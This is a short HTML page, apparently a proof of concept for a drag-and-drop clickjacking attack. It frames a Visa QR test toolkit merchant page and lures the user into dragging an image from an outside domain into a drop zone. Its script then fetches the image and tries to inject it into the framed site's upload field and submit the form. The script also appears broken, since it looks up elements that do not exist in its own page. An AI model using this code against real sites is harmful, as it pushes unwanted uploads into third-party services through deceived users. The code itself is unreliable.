<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drag Image to Upload</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: space-around;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .image-container, .upload-container {
            border: 2px dashed #ccc;
            border-radius: 10px;
            padding: 20px;
            background-color: white;
            text-align: center;
            width: 300px;
        }

        .image-container img {
            max-width: 100%;
            height: auto;
            cursor: grab;
        }

        .upload-container.dragover {
            border-color: #333;
            background-color: #f9f9f9;
        }

        .upload-container img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
            display: none;
        }

        .upload-container p {
            margin: 0;
            font-size: 16px;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="image-container">
        <p>Drag this image to the form</p>
        <img id="draggable-image" src="https://r1p.xyz/testx.png" alt="Test Image" draggable="true">
    </div>

    <div class="upload-container" id="drop-zone">
        <img id="preview" src="" alt="Image preview">
        <p>Drop the image here to upload</p>
    </div>

 <iframe src="https://technologypartner.visa.com/qrtesttoolkit/Merchant.aspx"></iframe>

    <script>
        const dropZone = document.getElementById('drop-zone');
        const fileInput = document.getElementById('ctl00$LayoutContent$qrUpload');
        const preview = document.getElementById('preview');
        const uploadForm = document.getElementById('upload-form');
        const draggableImage = document.getElementById('draggable-image');

        draggableImage.addEventListener('dragstart', (e) => {
            e.dataTransfer.setData('text/uri-list', draggableImage.src);
        });

        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.classList.add('dragover');
        });

        dropZone.addEventListener('dragleave', () => {
            dropZone.classList.remove('dragover');
        });

        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.classList.remove('dragover');

            const imageUrl = e.dataTransfer.getData('text/uri-list');
            if (imageUrl) {
                preview.src = imageUrl;
                preview.style.display = 'block';

                fetch(imageUrl)
                    .then(res => res.blob())
                    .then(blob => {
                        const file = new File([blob], "image.jpg", { type: blob.type });
                        const dataTransfer = new DataTransfer();
                        dataTransfer.items.add(file);
                        fileInput.files = dataTransfer.files;
                        uploadForm.submit();
                    })
                    .catch(error => console.error('Error fetching the image:', error));
            } else {
                alert('Please drag an image to the form.');
            }
        });
    </script>

</body>
</html>
